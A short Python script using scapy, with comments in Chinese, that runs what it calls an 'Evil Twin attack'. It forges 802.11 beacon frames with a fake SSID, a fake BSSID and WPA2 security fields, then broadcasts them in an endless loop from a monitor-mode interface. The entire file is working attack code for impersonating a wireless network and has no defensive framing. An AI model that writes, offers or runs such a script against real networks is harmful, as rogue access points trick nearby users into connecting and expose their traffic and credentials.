from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap
import time

import os
import subprocess

def evil_twin_attack(fake_ssid, fake_bssid, iface):
    # Check if the interface exists and is in monitor mode
    try:
        result = subprocess.run(['iwconfig', iface], capture_output=True, text=True)
        if 'Mode:Monitor' not in result.stdout:
            raise ValueError(f"Interface '{iface}' is not in monitor mode!")
    except FileNotFoundError:
        raise ValueError(f"Interface '{iface}' not found!")

    # 构建 802.11 帧
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=fake_bssid, addr3=fake_bssid)
    beacon = Dot11Beacon(cap="ESS+privacy")
    essid = Dot11Elt(ID="SSID", info=fake_ssid, len=len(fake_ssid))
    rsn = Dot11Elt(ID=48, info=(b"\x01\x00"
                                b"\x00\x0f\xac\x02"
                                b"\x02\x00"
                                b"\x00\x0f\xac\x04"
                                b"\x01\x00"
                                b"\x00\x0f\xac\x02"
                                b"\x00\x00"))
    
    # 构建无线帧 (RadioTap 是低层协议)
    frame = RadioTap()/dot11/beacon/essid/rsn

    print(f"Starting Evil Twin attack with SSID: {fake_ssid} and BSSID: {fake_bssid}")
    
    # 不断发送伪造的信标帧
    while True:
        sendp(frame, iface=iface, inter=0.1, loop=0)  # inter 设置为0.1秒发送一次
        time.sleep(0.1)

# 指定伪造的 SSID 和 BSSID
evil_twin_attack("FakeNetwork", "12:34:56:78:9A:BC", "wlan0mon")
